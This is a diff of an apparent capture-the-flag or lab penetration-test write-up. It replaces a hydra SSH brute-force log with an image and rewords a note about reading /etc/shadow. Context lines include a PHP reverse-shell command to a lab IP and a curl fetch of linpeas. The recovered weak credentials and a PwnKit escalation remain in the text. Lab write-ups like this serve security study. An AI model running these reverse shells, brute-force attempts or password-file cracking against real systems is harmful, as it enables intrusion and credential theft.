@@ -79,23 +79,7 @@ exec("/bin/bash -c 'bash -i >& /dev/tcp/10.1.26.20/1234 0>&1'");
 
 ### Method 3 - Brute Force SSH
 - We can use hydra to brute force ssh on the server
-
-```
-┌──(kali㉿kali-99-590)-[~/exploits]
-└─$ hydra -L namelist.txt -P /usr/share/wordlists/fasttrack.txt  10.1.26.30 ssh
-Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
-
-Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-03-06 16:40:37
-[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
-[DATA] max 16 tasks per 1 server, overall 16 tasks, 7548 login tries (l:34/p:222), ~472 tries per task
-[DATA] attacking ssh://10.1.26.30:22/
-[STATUS] 166.00 tries/min, 166 tries in 00:01h, 7383 to do in 00:45h, 15 active
-[22][ssh] host: 10.1.26.30   login: jennifer   password: 123456
-[STATUS] 140.67 tries/min, 422 tries in 00:03h, 7127 to do in 00:51h, 15 active
-[22][ssh] host: 10.1.26.30   login: root   password: dragon
-^C^CThe session file ./hydra.restore was written. Type "hydra -R" to resume session.
-```
-
+![[hydra.png]]
 - From this we see we have 2 main users 
 	- jennifer: 123456
 	- root: dragon
@@ -112,7 +96,7 @@ curl -L https://github.com/carlospolop/PEASSng/releases/latest/download/linpeas.
 
 - Linpeas tells us that the machine is vulnerable to CVE-2021-4043 or PwnKit - a polkit exploit
 - It also says its potentially vulnerable to CVE-2022-2588 however after looking into the CVE it does not seem to work with the kernel the victim box is running
-- We also get the root shadow file which we can crack with john
+- We also see that we are able to read the /etc/shadow file which we can try and crack with john
 
 
 ## Priv Esc
